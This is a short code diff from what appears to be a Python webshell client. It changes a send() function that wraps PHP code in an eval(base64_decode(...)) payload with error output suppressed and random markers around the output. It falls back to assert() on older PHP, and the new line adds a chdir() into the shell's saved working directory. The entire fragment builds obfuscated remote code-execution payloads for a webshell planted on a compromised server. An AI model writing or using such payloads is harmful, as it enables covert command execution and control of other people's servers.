@@ -85,7 +85,7 @@ def send(data: str, raw: bool = False, **extra_params):
     head = randstr(offset)
     tail = randstr(offset)
     if not raw:
-        data = f"""eval('error_reporting(0);print(\\'{head}\\');eval(base64_decode("{base64_encode(data)}"));print(\\'{tail}\\');');"""
+        data = f"""eval('error_reporting(0);chdir("{gget("webshell.pwd", "webshell")}");print(\\'{head}\\');eval(base64_decode("{base64_encode(data)}"));print(\\'{tail}\\');');"""
         if (not php_v7):
             data = f"""assert(base64_decode("{base64_encode(data)}"));"""
     for func in encode_functions:
